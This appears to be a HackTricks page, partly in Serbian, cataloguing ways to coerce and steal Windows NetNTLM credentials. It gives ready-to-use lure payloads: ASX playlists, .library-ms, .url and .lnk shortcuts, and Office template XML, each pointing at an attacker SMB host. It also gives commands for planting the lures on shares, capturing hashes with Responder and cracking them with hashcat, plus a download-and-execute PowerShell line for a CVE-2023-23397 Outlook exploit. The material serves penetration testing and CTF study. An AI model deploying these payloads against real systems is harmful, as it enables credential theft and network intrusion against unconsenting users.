# Places to steal NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Pogledajte sve odlične ideje sa [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) — od preuzimanja microsoft word fajla online do ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md i [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Ako možete da **pišete na share koji korisnici ili zakazani jobovi pregledaju u Explorer-u**, postavite fajlove čiji metadata pokazuje na vaš UNC (npr. `\\ATTACKER\share`). Prikazivanje foldera pokreće **implicit SMB authentication** i leaks a **NetNTLMv2** to your listener.

1. **Kreirajte mamce** (covers SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Položi ih na deljenu fasciklu u koju se može pisati** (bilo koji folder koji žrtva otvori):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows može istovremeno pokušati da pristupi više fajlova; sve što Explorer preview-uje (`BROWSE TO FOLDER`) ne zahteva klik.

### Windows Media Player playlists (.ASX/.WAX)

Ako možete navesti metu da otvori ili pregleda Windows Media Player playlistu koju kontrolišete, možete leak Net‑NTLMv2 usmeravanjem stavke na UNC putanju. WMP će pokušati da preuzme referencirani medij preko SMB i autentifikovaće se implicitno.

Primer payload-a:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Tok prikupljanja i crackinga:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer nesigurno postupa sa .library-ms fajlovima kada se oni otvore direktno iz ZIP arhive. Ako definicija biblioteke pokazuje na udaljenu UNC putanju (npr. \\attacker\share), samo pregledanje/pokretanje .library-ms unutar ZIP-a nateraće Explorer da enumeriše UNC i pošalje NTLM autentifikacione podatke napadaču. Ovo rezultira NetNTLMv2 koji može biti cracked offline ili potencijalno relayed.

Minimalna .library-ms koja pokazuje na UNC napadača
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operativni koraci
- Kreirajte .library-ms fajl sa XML-om iznad (podesite svoj IP/hostname).
- Zipujte ga (na Windows: Send to → Compressed (zipped) folder) i dostavite ZIP ciljnom sistemu.
- Pokrenite NTLM capture listener i sačekajte da žrtva otvori .library-ms iz ZIP-a.


### Putanja zvuka podsetnika u Outlook kalendaru (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows je obrađivao extended MAPI property PidLidReminderFileParameter u stavkama kalendara. Ako to svojstvo pokazuje na UNC path (npr. \\attacker\share\alert.wav), Outlook bi kontaktirao SMB share kada se podsetnik aktivira, leaking korisnikov Net‑NTLMv2 bez ikakvog klika. Ovo je zakrpljeno 14. marta 2023, ali je i dalje visoko relevantno za zastarele ili neosvežene flote i za istorijsko istraživanje incidenata.

Brza eksploatacija pomoću PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Listener strana:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Napomene
- Žrtvi je dovoljno da Outlook for Windows bude pokrenut kada se podsetnik aktivira.
- The leak daje Net‑NTLMv2 pogodan za offline cracking ili relay (ne pass‑the‑hash).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer automatski prikazuje ikone prečica. Nedavno istraživanje je pokazalo da čak i nakon Microsoftove aprilske zakrpe iz 2025. za UNC‑icon shortcuts, i dalje je bilo moguće pokrenuti NTLM autentifikaciju bez kliktanja tako što bi se target prečice hostovao na UNC putanji, a ikona držala lokalno (bypass zakrpe dodeljen CVE‑2025‑50154). Samo pregledanje foldera navodi Explorer da preuzme metapodatke sa udaljenog targeta, emitujući NTLM ka napadačevom SMB serveru.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Prečica programa payload (.lnk) putem PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Ideje za isporuku
- Drop the shortcut in a ZIP and get the victim to browse it.
- Place the shortcut on a writable share the victim will open.
- Combine with other lure files in the same folder so Explorer previews the items.

### Bez klika .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows loads `.lnk` metadata during **view/preview** (icon rendering), not only on execution. CVE‑2026‑25185 shows a parsing path where **ExtraData** blocks cause the shell to resolve an icon path and touch the filesystem **during load**, emitting outbound NTLM when the path is remote.

Key trigger conditions (observed in `CShellLink::_LoadFromStream`):
- Include **DARWIN_PROPS** (`0xa0000006`) in ExtraData (gate to icon update routine).
- Include **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) with **TargetUnicode** populated.
- The loader expands environment variables in `TargetUnicode` and calls `PathFileExistsW` on the resulting path.

If `TargetUnicode` resolves to a UNC path (e.g., `\\attacker\share\icon.ico`), **merely viewing a folder** containing the shortcut causes outbound authentication. The same load path can also be hit by **indexing** and **AV scanning**, making it a practical no‑click leak surface.

Research tooling (parser/generator/UI) is available in the **LnkMeMaybe** project to build/inspect these structures without using the Windows GUI.


### Office remote template injection (.docx/.dotm) to coerce NTLM

Office documents can reference an external template. If you set the attached template to a UNC path, opening the document will authenticate to SMB.

Minimal DOCX relationship changes (inside word/):

1) Izmenite word/settings.xml i dodajte referencu na priloženi template:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Izmenite word/_rels/settings.xml.rels i postavite rId1337 na vaš UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Repakuj u .docx i dostavi. Pokreni svoj SMB capture listener i sačekaj otvaranje.

Za post-capture ideje o relaying-u ili zloupotrebi NTLM, pogledaj:

{{#ref}}
README.md
{{#endref}}


## Reference
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)


{{#include ../../banners/hacktricks-training.md}}
